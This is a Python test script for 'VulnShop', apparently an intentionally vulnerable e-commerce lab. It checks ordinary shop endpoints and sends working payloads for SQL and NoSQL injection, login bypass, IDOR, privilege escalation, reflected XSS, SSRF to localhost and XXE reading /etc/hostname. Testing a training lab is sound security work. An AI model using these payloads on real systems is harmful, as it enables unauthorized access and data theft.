#!/usr/bin/env python3
"""
VulnShop Backend Testing Suite
Tests both normal e-commerce functionality and intentional security vulnerabilities
"""

import requests
import json
import sys
import time
from datetime import datetime
from urllib.parse import quote

class VulnShopTester:
    def __init__(self, base_url="https://vulnlab-cyber.preview.emergentagent.com"):
        self.base_url = base_url
        self.api_url = f"{base_url}/api"
        self.token = None
        self.user_id = None
        self.tests_run = 0
        self.tests_passed = 0
        self.vulnerabilities_found = 0
        self.session = requests.Session()
        
        # Test results storage
        self.results = {
            "normal_functionality": [],
            "vulnerabilities": [],
            "errors": []
        }

    def log_result(self, category, test_name, success, details="", vulnerability=False):
        """Log test result"""
        self.tests_run += 1
        if success:
            self.tests_passed += 1
            if vulnerability:
                self.vulnerabilities_found += 1
        
        result = {
            "test": test_name,
            "success": success,
            "details": details,
            "timestamp": datetime.now().isoformat()
        }
        
        if vulnerability:
            self.results["vulnerabilities"].append(result)
        elif category == "error":
            self.results["errors"].append(result)
        else:
            self.results["normal_functionality"].append(result)
        
        status = "✅ PASS" if success else "❌ FAIL"
        vuln_marker = " 🚨 VULN" if vulnerability else ""
        print(f"{status}{vuln_marker} {test_name}: {details}")

    def test_basic_connectivity(self):
        """Test basic API connectivity"""
        try:
            response = self.session.get(f"{self.api_url}/")
            success = response.status_code == 200
            details = f"Status: {response.status_code}"
            if success:
                data = response.json()
                details += f", Message: {data.get('message', 'N/A')}"
            self.log_result("basic", "API Root Endpoint", success, details)
            return success
        except Exception as e:
            self.log_result("error", "API Root Endpoint", False, f"Connection error: {str(e)}")
            return False

    def test_user_registration(self):
        """Test user registration"""
        try:
            test_user = f"testuser_{int(time.time())}"
            payload = {
                "username": test_user,
                "email": f"{test_user}@test.com",
                "password": "TestPass123!"
            }
            
            response = self.session.post(f"{self.api_url}/auth/register", json=payload)
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("success"):
                    self.token = data.get("token")
                    self.user_id = data.get("user", {}).get("id")
                    self.session.headers.update({"Authorization": f"Bearer {self.token}"})
                    details = f"User created: {test_user}, Token received"
                else:
                    success = False
                    details = f"Registration failed: {data.get('message', 'Unknown error')}"
            else:
                details = f"Status: {response.status_code}, Response: {response.text[:100]}"
            
            self.log_result("auth", "User Registration", success, details)
            return success
        except Exception as e:
            self.log_result("error", "User Registration", False, f"Error: {str(e)}")
            return False

    def test_user_login(self):
        """Test user login with existing credentials"""
        try:
            # Try to login with a known user (guest/guest from SQLite)
            payload = {
                "username": "guest",
                "password": "guest"
            }
            
            response = self.session.post(f"{self.api_url}/auth/login", json=payload)
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("success"):
                    details = f"Login successful for guest user"
                else:
                    success = False
                    details = f"Login failed: {data.get('message', 'Unknown error')}"
            else:
                details = f"Status: {response.status_code}"
            
            self.log_result("auth", "User Login", success, details)
            return success
        except Exception as e:
            self.log_result("error", "User Login", False, f"Error: {str(e)}")
            return False

    def test_products_listing(self):
        """Test products listing"""
        try:
            response = self.session.get(f"{self.api_url}/products")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                products = data.get("products", [])
                details = f"Found {len(products)} products"
            else:
                details = f"Status: {response.status_code}"
            
            self.log_result("products", "Products Listing", success, details)
            return success
        except Exception as e:
            self.log_result("error", "Products Listing", False, f"Error: {str(e)}")
            return False

    def test_product_detail(self):
        """Test individual product detail"""
        try:
            # Test with product ID 1 (should exist from init data)
            response = self.session.get(f"{self.api_url}/products/1")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                product = data.get("product", {})
                details = f"Product: {product.get('name', 'Unknown')}, Price: ${product.get('price', 0)}"
            else:
                details = f"Status: {response.status_code}"
            
            self.log_result("products", "Product Detail", success, details)
            return success
        except Exception as e:
            self.log_result("error", "Product Detail", False, f"Error: {str(e)}")
            return False

    def test_categories(self):
        """Test categories endpoint"""
        try:
            response = self.session.get(f"{self.api_url}/categories")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                categories = data.get("categories", [])
                details = f"Found {len(categories)} categories: {', '.join(categories[:3])}"
            else:
                details = f"Status: {response.status_code}"
            
            self.log_result("products", "Categories", success, details)
            return success
        except Exception as e:
            self.log_result("error", "Categories", False, f"Error: {str(e)}")
            return False

    def test_sql_injection_search(self):
        """Test SQL Injection in product search"""
        try:
            # SQL injection payload to extract data
            payload = "' UNION SELECT id,name,description,price,category,image_url,stock FROM products--"
            encoded_payload = quote(payload)
            
            response = self.session.get(f"{self.api_url}/products/search?q={encoded_payload}")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if "products" in data and len(data["products"]) > 0:
                    # Check if we got more results than expected (indicating injection worked)
                    details = f"SQL Injection successful - Retrieved {len(data['products'])} products"
                    vulnerability = True
                else:
                    details = "SQL Injection attempt - No extra data retrieved"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "SQL Injection - Product Search", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "SQL Injection - Product Search", False, f"Error: {str(e)}")
            return False

    def test_sql_injection_login(self):
        """Test SQL Injection in legacy login"""
        try:
            # SQL injection to bypass login
            username = "admin' OR '1'='1"
            password = "anything"
            
            response = self.session.post(f"{self.api_url}/auth/legacy-login?username={quote(username)}&password={quote(password)}")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("success") and "token" in data:
                    details = f"SQL Injection login bypass successful - Got admin token"
                    vulnerability = True
                else:
                    details = f"SQL Injection attempt failed: {data.get('message', 'Unknown')}"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "SQL Injection - Legacy Login", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "SQL Injection - Legacy Login", False, f"Error: {str(e)}")
            return False

    def test_nosql_injection(self):
        """Test NoSQL Injection in user lookup"""
        try:
            # NoSQL injection payload
            payload = '{"$where": "this.username"}'
            encoded_payload = quote(payload)
            
            response = self.session.get(f"{self.api_url}/users/lookup?filter={encoded_payload}")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if "users" in data and len(data["users"]) > 0:
                    details = f"NoSQL Injection successful - Retrieved {len(data['users'])} users"
                    vulnerability = True
                else:
                    details = "NoSQL Injection attempt - No users retrieved"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "NoSQL Injection - User Lookup", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "NoSQL Injection - User Lookup", False, f"Error: {str(e)}")
            return False

    def test_idor_profile(self):
        """Test IDOR vulnerability in profile access"""
        try:
            # Try to access another user's profile (assuming user ID 1 exists)
            target_user_id = "1"
            response = self.session.get(f"{self.api_url}/profile/{target_user_id}")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if "profile" in data:
                    profile = data["profile"]
                    details = f"IDOR successful - Accessed profile: {profile.get('username', 'Unknown')}"
                    vulnerability = True
                else:
                    details = "IDOR attempt failed - No profile data"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "IDOR - Profile Access", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "IDOR - Profile Access", False, f"Error: {str(e)}")
            return False

    def test_privilege_escalation(self):
        """Test privilege escalation via profile update"""
        if not self.token:
            self.log_result("vuln", "Privilege Escalation", False, "No authentication token available")
            return False
        
        try:
            # Try to escalate privileges to admin
            payload = {
                "role": "admin"
            }
            
            response = self.session.put(f"{self.api_url}/profile/update", json=payload)
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("success"):
                    profile = data.get("profile", {})
                    if profile.get("role") == "admin":
                        details = f"Privilege escalation successful - Now admin user"
                        vulnerability = True
                    else:
                        details = f"Profile updated but role unchanged: {profile.get('role')}"
                        vulnerability = False
                else:
                    details = "Profile update failed"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "Privilege Escalation", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "Privilege Escalation", False, f"Error: {str(e)}")
            return False

    def test_hidden_admin_panel(self):
        """Test access to hidden admin panel"""
        try:
            response = self.session.get(f"{self.api_url}/c0ntr0l-p4n3l/")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("challenge_complete"):
                    details = f"Hidden admin panel found! Message: {data.get('message', 'N/A')}"
                    vulnerability = True
                else:
                    details = "Admin panel accessible but no challenge completion"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "Hidden Admin Panel Discovery", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "Hidden Admin Panel Discovery", False, f"Error: {str(e)}")
            return False

    def test_business_logic_negative_quantity(self):
        """Test business logic flaw - negative quantity in checkout"""
        if not self.token:
            self.log_result("vuln", "Business Logic - Negative Quantity", False, "No authentication token available")
            return False
        
        try:
            # Try to checkout with negative quantity
            payload = {
                "items": [
                    {
                        "product_id": 1,
                        "quantity": -5  # Negative quantity
                    }
                ],
                "shipping_address": "123 Test St, Test City"
            }
            
            response = self.session.post(f"{self.api_url}/checkout", json=payload)
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("success"):
                    order = data.get("order", {})
                    total = order.get("total", 0)
                    if total < 0:
                        details = f"Business logic flaw - Negative total allowed: ${total}"
                        vulnerability = True
                    else:
                        details = f"Checkout processed but total positive: ${total}"
                        vulnerability = False
                else:
                    details = "Checkout failed as expected"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "Business Logic - Negative Quantity", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "Business Logic - Negative Quantity", False, f"Error: {str(e)}")
            return False

    def test_coupon_validation(self):
        """Test coupon validation system"""
        try:
            # Test valid coupon
            response = self.session.get(f"{self.api_url}/coupons/validate/WELCOME10")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("valid"):
                    coupon = data.get("coupon", {})
                    details = f"Valid coupon found: {coupon.get('description', 'N/A')}"
                else:
                    details = "Coupon validation working - invalid coupon rejected"
            else:
                details = f"Status: {response.status_code}"
            
            self.log_result("business", "Coupon Validation", success, details)
            return success
        except Exception as e:
            self.log_result("error", "Coupon Validation", False, f"Error: {str(e)}")
            return False

    def test_reflected_xss(self):
        """Test reflected XSS in search render endpoint"""
        try:
            # XSS payload
            xss_payload = "<script>alert('XSS')</script>"
            encoded_payload = quote(xss_payload)
            
            response = self.session.get(f"{self.api_url}/search/render?q={encoded_payload}")
            success = response.status_code == 200
            
            if success:
                content = response.text
                if xss_payload in content:
                    details = f"Reflected XSS vulnerability confirmed - Script tag reflected"
                    vulnerability = True
                else:
                    details = "XSS payload not reflected or sanitized"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "Reflected XSS - Search Render", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "Reflected XSS - Search Render", False, f"Error: {str(e)}")
            return False

    def test_vulnerabilities_documentation(self):
        """Test vulnerabilities documentation endpoint"""
        try:
            response = self.session.get(f"{self.api_url}/vulnerabilities")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                vulns = data.get("vulnerabilities", [])
                total_count = data.get("total_count", 0)
                categories = data.get("categories", {})
                
                if total_count == 16 and len(vulns) == 16:
                    details = f"Documentation complete - {total_count} vulnerabilities, {len(categories)} categories"
                else:
                    details = f"Documentation incomplete - Expected 16, got {len(vulns)} vulnerabilities"
                    success = False
            else:
                details = f"Status: {response.status_code}"
            
            self.log_result("docs", "Vulnerabilities Documentation", success, details)
            return success
        except Exception as e:
            self.log_result("error", "Vulnerabilities Documentation", False, f"Error: {str(e)}")
            return False

    def test_ssrf_webhook(self):
        """Test SSRF vulnerability in webhook test endpoint"""
        try:
            # SSRF payload to access internal service
            payload = {
                "url": "http://localhost:8001/api/"
            }
            
            response = self.session.post(f"{self.api_url}/webhook/test", json=payload)
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if "content" in data and data.get("status_code") == 200:
                    details = f"SSRF successful - Accessed internal service, got {data.get('content_length', 0)} bytes"
                    vulnerability = True
                elif "error" in data:
                    details = f"SSRF attempt failed: {data['error']}"
                    vulnerability = False
                else:
                    details = f"SSRF response unclear: {data}"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "SSRF - Webhook Test", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "SSRF - Webhook Test", False, f"Error: {str(e)}")
            return False

    def test_ssrf_image_fetch(self):
        """Test SSRF vulnerability in image fetch endpoint"""
        try:
            # SSRF payload to access internal service
            internal_url = "http://localhost:8001/api/"
            
            response = self.session.get(f"{self.api_url}/fetch-image?url={quote(internal_url)}")
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("status") == 200:
                    details = f"SSRF successful - Fetched internal URL, size: {data.get('size', 0)} bytes"
                    vulnerability = True
                elif "error" in data:
                    details = f"SSRF attempt failed: {data['error']}"
                    vulnerability = False
                else:
                    details = f"SSRF response unclear: {data}"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "SSRF - Image Fetch", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "SSRF - Image Fetch", False, f"Error: {str(e)}")
            return False

    def test_xxe_product_import(self):
        """Test XXE vulnerability in product import endpoint"""
        try:
            # XXE payload to read local file
            xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<products>
  <product>
    <name>&xxe;</name>
    <price>100</price>
    <description>Test product</description>
    <category>Test</category>
  </product>
</products>'''
            
            payload = {
                "xml_data": xxe_payload
            }
            
            response = self.session.post(f"{self.api_url}/import/products", json=payload)
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("success"):
                    products = data.get("parsed_products", [])
                    if products and len(products[0].get("name", "")) > 0:
                        name_content = products[0]["name"]
                        if name_content != "&xxe;" and len(name_content.strip()) > 0:
                            details = f"XXE successful - File content leaked: {name_content[:50]}..."
                            vulnerability = True
                        else:
                            details = "XXE attempt - Entity not resolved"
                            vulnerability = False
                    else:
                        details = "XXE attempt - No product data parsed"
                        vulnerability = False
                else:
                    details = f"XXE failed: {data.get('error', 'Unknown error')}"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "XXE - Product Import", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "XXE - Product Import", False, f"Error: {str(e)}")
            return False

    def test_xxe_config_import(self):
        """Test XXE vulnerability in config import endpoint"""
        try:
            # XXE payload to read local file
            xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<config>
  <setting>&xxe;</setting>
  <debug>true</debug>
</config>'''
            
            response = self.session.post(
                f"{self.api_url}/config/import", 
                data=xxe_payload,
                headers={"Content-Type": "application/xml"}
            )
            success = response.status_code == 200
            
            if success:
                data = response.json()
                if data.get("success"):
                    config = data.get("config", {})
                    setting_value = config.get("setting", "")
                    if setting_value != "&xxe;" and len(setting_value.strip()) > 0:
                        details = f"XXE successful - File content leaked: {setting_value[:50]}..."
                        vulnerability = True
                    else:
                        details = "XXE attempt - Entity not resolved"
                        vulnerability = False
                else:
                    details = f"XXE failed: {data.get('error', 'Unknown error')}"
                    vulnerability = False
            else:
                details = f"Status: {response.status_code}"
                vulnerability = False
            
            self.log_result("vuln", "XXE - Config Import", success, details, vulnerability)
            return success
        except Exception as e:
            self.log_result("error", "XXE - Config Import", False, f"Error: {str(e)}")
            return False

    def run_all_tests(self):
        """Run all tests"""
        print("🚀 Starting VulnShop Backend Testing Suite")
        print("=" * 60)
        
        # Basic connectivity
        if not self.test_basic_connectivity():
            print("❌ Basic connectivity failed. Stopping tests.")
            return False
        
        # Initialize data
        try:
            self.session.post(f"{self.api_url}/init-data")
            print("📊 Data initialization attempted")
        except:
            pass
        
        # Normal functionality tests
        print("\n📋 Testing Normal E-commerce Functionality:")
        print("-" * 40)
        self.test_user_registration()
        self.test_user_login()
        self.test_products_listing()
        self.test_product_detail()
        self.test_categories()
        self.test_coupon_validation()
        
        # Security vulnerability tests
        print("\n🚨 Testing Security Vulnerabilities:")
        print("-" * 40)
        self.test_sql_injection_search()
        self.test_sql_injection_login()
        self.test_nosql_injection()
        self.test_idor_profile()
        self.test_privilege_escalation()
        self.test_business_logic_negative_quantity()
        self.test_reflected_xss()
        self.test_hidden_admin_panel()
        
        # Summary
        print("\n" + "=" * 60)
        print("📊 TEST SUMMARY")
        print("=" * 60)
        print(f"Total Tests: {self.tests_run}")
        print(f"Passed: {self.tests_passed}")
        print(f"Failed: {self.tests_run - self.tests_passed}")
        print(f"Vulnerabilities Found: {self.vulnerabilities_found}")
        
        success_rate = (self.tests_passed / self.tests_run * 100) if self.tests_run > 0 else 0
        print(f"Success Rate: {success_rate:.1f}%")
        
        if self.vulnerabilities_found > 0:
            print(f"\n🎯 Security Lab Status: {self.vulnerabilities_found} vulnerabilities confirmed exploitable")
        
        return success_rate > 70  # Consider successful if >70% tests pass

def main():
    tester = VulnShopTester()
    success = tester.run_all_tests()
    
    # Save detailed results
    with open("/tmp/backend_test_results.json", "w") as f:
        json.dump(tester.results, f, indent=2)
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())